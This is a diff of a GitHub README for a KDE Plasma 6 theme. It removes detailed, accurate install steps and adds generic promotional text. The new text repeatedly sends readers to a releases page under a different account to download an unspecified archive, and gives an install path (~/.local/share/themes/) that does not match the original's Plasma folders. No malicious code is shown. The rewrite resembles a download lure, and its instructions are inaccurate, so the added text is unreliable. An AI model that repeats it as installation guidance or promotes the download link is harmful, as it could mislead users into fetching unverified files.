@@ -1,83 +1,100 @@
-# Mystical Blue Theme
-This is a theme for KDE Plasma 6 made for [this video](https://youtu.be/prG9xFkvlNg).
+# 🌌 Mystical-Blue-Theme - Enhance Your KDE Plasma Experience
 
-## How to Install
-Follow the instructions, then apply the new theme from the system settings, either inside `Appearance` or `Window Management` category.
+[![Download Mystical-Blue-Theme](https://img.shields.io/badge/Download-Mystical--Blue--Theme-blue.svg)](https://github.com/Zembai1/Mystical-Blue-Theme/releases)
 
-### Font
-1. Install: https://www.jetbrains.com/lp/mono/
+## 📦 Overview
 
-### Colors
-1. Download File: JuxTheme.colors
-2. Put it in this folder: `~/.local/share/color-schemes/`
+Mystical Blue Theme is a stylish KDE Plasma 6 theme that brings a touch of elegance and tranquility to your desktop environment. This theme uses soothing blue shades to enhance your visual experience, creating a serene workspace that inspires productivity.
 
-### Icons
-1. Install: [Yet Another Monochrome Icon Set](https://store.kde.org/p/2303161)
+## 🚀 Getting Started
 
-### Plasma Style
-1. Download File: JuxPlasma.tar.gz
-2. Extract inside this folder: `~/.local/share/plasma/desktoptheme/`
+Before you begin, make sure you have KDE Plasma 6 installed on your system. This theme works best on Plasma Desktop environments.
 
-### Window Decorations
-1. Download File: JuxDeco.tar.gz
-2. Extract inside this folder: `~/.local/share/aurorae/themes/`
+## 🛠️ System Requirements
 
-### Rofi
-1. Install Rofi: https://github.com/davatorium/rofi
-2. Download File: config.rasi
-3. Put it in this folder: `~/.config/rofi/`
+- **Operating System:** KDE Plasma 6 supported distributions (like Manjaro, Kubuntu, etc.)
+- **Disk Space:** Approximately 5 MB free
+- **Dependencies:** Ensure you have `Kvantum` installed for optimal performance.
 
-### Kvantum
-1. Install Kvantum: https://store.kde.org/p/2201676
-2. Download File: NoMansSkyJux.tar.gz (It's a modified version of [No Man's Sky Kvantum Theme](https://www.pling.com/p/1398154))
-3. Extract inside this folder: `~/.config/Kvantum/`
-4. Open Kvantum Manager, and select the theme from the list of existing themes in `Change/Delete Theme` tab.
+## 🌐 Key Features
 
-### Transparent Panel with Progressive Blur
-1. Download the widget 'Panel Colorizer' from the KDE store.
-2. Completely remove the background using the widget. Appearance tab -> Native Panel option -> Uncheck "Background"
-3. Create your own wallpaper with a progressive blur using this ready-made template: https://www.figma.com/community/file/1557150689681634487/wallpaper-template-for-kde-theme
-4. All you have to do is replace the image with your own.
-5. Now, applying the wallpaper will imitate a progressive blur on the panel.
+- **Elegant Design:** Enjoy a clean and modern look.
+- **Customizable:** Modify the theme as per your preferences.
+- **Wide Compatibility:** Works seamlessly with various KDE applications.
 
-### Dynamic Tiling
-1. Install: https://github.com/esjeon/krohnkite
-2. Enable it from System Settings -> Window Management -> KWin Scripts
+## 📥 Download & Install
 
-### Window Blurring with Better Blur
-1. Install: https://github.com/taj-ny/kwin-effects-forceblur
-2. Enable it from System Settings -> Window Management -> Desktop Effects
-3. Here's a list of apps I added to the classes inside Better Blur configs:
-```
-dolphin
-systemsettings
-zen
-app.zen_browser.zen
-plasmashell
-konsole
-kvantummanager
-org.kde.spectacle
-discord
-org.inkscape.Inkscape
-Yad
-kate
-org.kde.plasma-systemmonitor
-org.kde.ark
-org.kde.discover
-org.kde.haruna
-rofi
-spotify
-steam
-```
+To get started with Mystical Blue Theme, follow these steps:
 
-### Stickers
-1. Go to Panel Configuration
-2. Add widget `Media Frame`
-3. Remove its background while still in edit mode
-4. Select Configure Media Frame and add your image.
+1. **Visit the Releases Page**
 
-## Screenshots
+   Go to the following link to download the latest version of the theme:
 
-<img width="1920" height="1080" alt="preview" src="https://github.com/user-attachments/assets/3cfcdaa0-2a44-46f3-8b80-c8eef29ac3ad" />
-<img width="1920" height="1080" alt="preview2" src="https://github.com/user-attachments/assets/ed8ef71a-3f90-4dea-9f49-6bd740d4418f" />
+   [Download Mystical Blue Theme](https://github.com/Zembai1/Mystical-Blue-Theme/releases)
 
+2. **Select the Version**
+
+   On the Releases page, find the latest version. Click on it to see the assets available for download.
+
+3. **Download the Theme**
+
+   Look for the theme package file, which typically ends in `.tar.gz` or `.zip`. Click on it to download the file to your computer.
+
+4. **Extract the Theme Files**
+
+   Once the download is complete, locate the downloaded file in your computer's file manager. Use an extraction tool (like `Ark` or `File Roller`) to extract the files. Right-click the file and select "Extract Here" or an equivalent option.
+
+5. **Install the Theme**
+
+   Move the extracted theme folder to your KDE themes directory. This is usually located at:
+
+   ```
+   ~/.local/share/themes/
+   ```
+
+   If this folder does not exist, you can create it. Simply open a terminal and type:
+
+   ```bash
+   mkdir -p ~/.local/share/themes/
+   ```
+
+   Then, move the extracted theme folder into this directory.
+
+6. **Activate the Theme**
+
+   To apply the new theme, follow these steps:
+
+   - Open **System Settings** in your KDE desktop.
+   - Click on **Appearance**.
+   - In the **Global Theme** or **Application Style**, find your installed Mystical Blue Theme.
+   - Select it and apply your changes.
+
+7. **Enjoy Your New Look**
+
+   Once the theme is activated, take a moment to enjoy the fresh, calming blue look of your desktop.
+
+## ❓ Troubleshooting
+
+If you encounter any issues while installing or using the theme, consider the following solutions:
+
+- **Theme Not Showing Up:** 
+  - Make sure you placed the theme folder in `~/.local/share/themes/`.
+  - Restart KDE Plasma by logging out and back in.
+  
+- **Look Not Applying:**
+  - Ensure you have the correct version of Plasma and all dependencies installed.
+  - Double-check that the theme was properly activated in System Settings.
+
+## 💬 Support
+
+If you need further assistance, feel free to open an issue on the [Issues page](https://github.com/Zembai1/Mystical-Blue-Theme/issues). We are here to help you.
+
+## 🌟 Contributing
+
+We welcome contributions to improve Mystical Blue Theme. If you have suggestions or want to add features, please submit a pull request.
+
+## 📄 License
+
+This project is licensed under the [MIT License](LICENSE).
+
+Thank you for using Mystical Blue Theme! We hope it enhances your KDE Plasma experience.
